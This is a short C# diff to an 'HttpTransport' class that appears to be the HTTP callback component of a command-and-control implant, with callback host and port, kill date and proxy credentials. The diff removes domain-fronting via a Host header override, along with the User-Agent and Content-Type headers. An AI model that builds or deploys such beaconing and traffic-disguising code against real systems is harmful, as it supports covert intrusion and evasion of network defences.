@@ -63,9 +63,7 @@ namespace HttpTransport
             Endpoint = string.Format("{0}:{1}", CallbackHost, CallbackPort);
             ProxyUser = data["proxy_user"];
             ProxyPass = data["proxy_pass"];
-            DomainFront = data["domain_front"];
             KillDate = data["killdate"];
-            UserAgent = data["USER_AGENT"];
 
             string[] reservedStrings = new[]
             {
@@ -79,9 +77,7 @@ namespace HttpTransport
                 "proxy_port",
                 "proxy_user",
                 "proxy_pass",
-                "domain_front",
                 "killdate",
-                "USER_AGENT",
             };
             
             foreach(string k in data.Keys)
@@ -161,19 +157,13 @@ namespace HttpTransport
                     BypassProxyOnLocal = false
                 };
             }
-
-            if (!string.IsNullOrEmpty(DomainFront) && DomainFront != "domain_front")
-            {
-                webClient.Headers.Add("Host", DomainFront);
-            }
-            webClient.Headers.Add("User-Agent", UserAgent);
+            
             foreach(string k in _additionalHeaders.Keys)
             {
                 webClient.Headers.Add(k, _additionalHeaders[k]);
             }
 
             webClient.BaseAddress = Endpoint;
-            webClient.Headers.Add("Content-Type", "text/plain");
             string sMsg = Serializer.Serialize(message);
             try
             {
